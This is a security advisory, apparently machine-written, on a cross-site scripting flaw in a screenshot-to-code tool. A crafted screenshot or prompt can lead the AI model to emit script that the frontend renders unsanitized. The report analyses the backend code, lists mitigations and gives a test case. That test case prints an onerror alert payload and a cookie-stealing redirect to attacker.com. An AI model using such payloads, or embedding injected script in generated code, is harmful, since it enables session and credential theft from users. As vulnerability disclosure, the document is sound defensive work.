## Vulnerabilities in AI-Generated Code

### Cross-Site Scripting (XSS) Vulnerability in AI-Generated Code

- **Description:**
  The application leverages AI models to generate frontend code (HTML, CSS, JavaScript, React, Vue, etc.) from user-provided screenshots, video recordings, or text prompts. This generated code is then transmitted to the frontend and rendered in the user's browser. A critical vulnerability arises because the AI models, when processing user inputs, can be tricked into generating malicious JavaScript code within the output. An attacker can craft a malicious screenshot, video, or text prompt containing elements that, when interpreted by the AI, result in the generation of JavaScript code capable of executing XSS attacks. For instance, an attacker can embed text resembling HTML tags with inline JavaScript event handlers or script tags directly within the input. If the frontend renders this AI-generated code without proper sanitization, any malicious JavaScript embedded within it will be executed in the victim's browser, leading to Cross-Site Scripting (XSS).

- **Impact:**
  Successful exploitation of this XSS vulnerability allows an attacker to execute arbitrary JavaScript code within the context of a victim's browser session. This can lead to severe security breaches, including:
    - **Account Takeover:** Attackers can steal session cookies or credentials, gaining unauthorized access to user accounts and impersonating victims.
    - **Data Theft:** Sensitive user data, including personal information, session tokens, and application data, can be exfiltrated to attacker-controlled servers.
    - **Malware Distribution:** Users can be redirected to malicious websites hosting malware, leading to system compromise.
    - **Website Defacement:** The visual appearance and functionality of the web application can be altered, damaging the application's reputation and user trust.
    - **Redirection to Malicious Sites:** Users can be redirected to phishing scams or other malicious websites to steal credentials or personal information.
    - **Performing Actions on Behalf of the User:** Attackers can perform actions on the application as the victim without their consent.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
  Currently, there are no effective mitigations implemented to prevent XSS vulnerabilities in the AI-generated code. The backend code includes a function `extract_html_content` in `backend\codegen\utils.py`, which attempts to extract HTML content from the AI's response using regular expressions. However, this function only extracts content within `<html>` tags and does not perform any sanitization or encoding of the generated HTML. Malicious JavaScript can still be embedded within HTML tags, such as through inline event handlers (e.g., `onload`, `onclick`) or `<script>` tags included within the HTML structure. The system prompts used to instruct the AI models also lack any instructions to sanitize or avoid generating potentially harmful code, focusing primarily on visual fidelity and functionality.

- **Missing Mitigations:**
  To effectively mitigate this XSS vulnerability, the following mitigations are crucial:
    - **Frontend Output Sanitization:** Implement robust sanitization of the AI-generated HTML code on the frontend before rendering it in the browser. This should involve parsing the HTML and removing or neutralizing any potentially malicious JavaScript code. Utilize a well-vetted HTML sanitization library, such as DOMPurify, to ensure comprehensive coverage of XSS attack vectors. The sanitization should specifically:
        - Remove or escape `<script>` tags and inline JavaScript.
        - Remove or neutralize JavaScript event handlers (e.g., `onload`, `onclick`, `onmouseover`, etc.) from HTML attributes.
        - Sanitize or disallow JavaScript URLs (e.g., `javascript:alert('XSS')`).
    - **Content Security Policy (CSP):** Implement a strict Content Security Policy (CSP) to limit the capabilities of the generated web pages and mitigate the impact of XSS. A restrictive CSP should be configured to:
        - Disable inline JavaScript execution (`script-src 'none'` or using 'nonce' or 'hash' based approach).
        - Restrict script sources to a whitelist of trusted domains (`script-src 'self' https://cdn.example.com`).
        - Disable `eval()` and similar unsafe JavaScript functions (`unsafe-inline`, `unsafe-eval` directives should be avoided or strictly controlled).
    - **Input Sanitization of AI-Generated Code (Backend):** Implement server-side sanitization of the AI-generated code before it is presented to the user. This acts as a secondary defense layer.
    - **Prompt Hardening:** Design prompts to be more robust against injection attacks by clearly separating instructions from input data and guiding the AI to follow instructions strictly, avoiding interpretation of input data as commands.
    - **User Education and Warnings:** Display clear warnings to users about the inherent security risks associated with deploying AI-generated code without thorough security review and testing. Emphasize the need for manual review and security audits of all generated code before deployment.
    - **Regular Security Audits and Testing:** Implement regular security audits and automated security testing as part of the development pipeline to identify and address vulnerabilities, including XSS, early in the development cycle.

- **Preconditions:**
    - The application must be running and accessible to the attacker.
    - The attacker needs to be able to upload a screenshot, provide a video, or text prompt input to the application.
    - The attacker must be able to craft a malicious input (screenshot, video or text prompt) that can successfully trick the AI model into generating code with XSS vulnerabilities. This may require some experimentation.
    - The frontend application must be rendering the `setCode` websocket messages as HTML content in the browser without sanitization.
    - A user must then deploy or utilize the generated code in an environment where it can be accessed and executed by other users' browsers without performing adequate security checks or sanitization of the AI-generated output.

- **Source Code Analysis:**
    1. **`backend\routes\generate_code.py`:** This file handles code generation requests via a websocket endpoint. The `stream_code` function receives user input, creates prompts, calls AI models, and sends the generated code to the frontend.
        ```python
        from codegen.utils import extract_html_content
        # ...
        async def stream_code(websocket: WebSocket):
            # ...
            completions = [extract_html_content(completion) for completion in completions]
            # ...
            for index, updated_html in enumerate(updated_completions):
                await send_message("setCode", updated_html, index)
        ```
        Notably, the `extract_html_content` function is used to process the AI's response, but it only extracts HTML content and does not perform any sanitization. The generated `updated_html` is directly sent to the frontend without further security processing.

    2. **`backend\codegen\utils.py`:** This file contains the `extract_html_content` function.
        ```python
        import re
        def extract_html_content(text: str):
            match = re.search(r"(<html.*?>.*?</html>)", text, re.DOTALL)
            if match:
                return match.group(1)
            else:
                return text
        ```
        This function uses a regular expression to extract content within `<html>` tags. It is designed for content extraction, not security, and does not provide any sanitization to prevent XSS.

    3. **`backend\prompts\__init__.py`, `backend\prompts\screenshot_system_prompts.py` & `backend\prompts\claude_prompts.py`:** These files define system prompts that instruct the AI models to generate code based on user input. The prompts prioritize visual accuracy and code functionality but do not include instructions for the AI to sanitize its output or avoid generating potentially harmful code. Some prompts even instruct the AI to "Use the exact text from the screenshot," which exacerbates the XSS risk.

    4. **`backend\llm.py`:** This file contains functions for interacting with AI models (OpenAI, Claude, Gemini). Functions like `stream_openai_response`, `stream_claude_response`, and `stream_gemini_response` handle communication with the respective AI APIs and stream back the raw responses without any sanitization or validation of the AI-generated code.

    5. **`backend\mock_llm.py`:** Mock responses in this file, such as `MORTGAGE_CALCULATOR_VIDEO_PROMPT_MOCK`, include `<script>` tags, demonstrating that the intended behavior of the application is to generate and handle HTML code that can contain JavaScript, further highlighting the XSS risk if not properly sanitized.

- **Security Test Case:**
    1. **Prepare a Malicious Screenshot:** Create an image (e.g., `xss_image.png`) and embed the following XSS payload within it as text or as part of a visual element: `<img src=x onerror=alert('XSS Vulnerability!')>`.
    2. **Access the Application:** Open the screenshot-to-code application in a web browser.
    3. **Upload the Malicious Screenshot:** Use the application's "Screenshot to Code" functionality to upload the crafted `xss_image.png`. Select any supported stack (e.g., HTML + Tailwind).
    4. **Generate Code and Inspect Output:** Initiate the code generation process. Once completed, examine the generated code displayed in the application's output. Verify that the generated code contains the injected XSS payload (e.g., `<img src=x onerror=alert('XSS Vulnerability!')>`).
    5. **Execute Generated Code in a Test HTML File:** Copy the generated HTML code. Create a new HTML file (e.g., `xss_test.html`), paste the copied code into it, and open `xss_test.html` in a web browser.
    6. **Verify XSS Execution:** Observe if an alert box appears in the browser displaying "XSS Vulnerability!". If the alert box appears, it confirms that the XSS payload was successfully injected into the AI-generated code and is executable in a web browser, validating the XSS vulnerability.
    7. **Further Test with Cookie Stealing Payload (Optional):** To further demonstrate impact, replace `alert('XSS Vulnerability!')` with code that attempts to steal cookies or redirect to a malicious site, such as `<script>window.location.href='http://attacker.com/cookie-stealer?cookie='+document.cookie;</script>`. Repeat steps 1-6 and observe if the browser redirects to `http://attacker.com/cookie-stealer` (or performs the intended malicious action), further confirming the XSS vulnerability and its potential impact.
